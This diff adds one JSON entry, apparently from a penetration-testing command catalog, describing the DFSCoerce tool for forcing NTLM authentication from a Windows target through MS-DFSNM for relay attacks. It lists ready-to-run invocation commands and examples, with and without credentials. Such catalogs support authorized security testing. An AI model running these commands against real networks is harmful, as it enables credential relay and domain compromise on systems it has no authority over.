@@ -1,0 +1,32 @@
+{
+  "id": "dfscoerce",
+  "name": "DFSCoerce",
+  "command": "python3 dfscoerce.py <listener_ip> <target_ip>",
+  "description": "Coerce NTLM authentication using MS-DFSNM (Distributed File System)",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "rpc",
+    "ntlm"
+  ],
+  "tags": [
+    "dfscoerce",
+    "coercion",
+    "ntlm",
+    "dfs",
+    "relay"
+  ],
+  "variations": [
+    {
+      "label": "With Credentials",
+      "requires": "password",
+      "command": "python3 dfscoerce.py -d '<domain>' -u '<user>' -p '<password>' <listener_ip> <target_ip>"
+    }
+  ],
+  "examples": [
+    "python3 dfscoerce.py 192.168.1.50 192.168.1.100",
+    "python3 dfscoerce.py -d 'corp.local' -u 'user' -p 'password' 192.168.1.50 192.168.1.100"
+  ]
+}
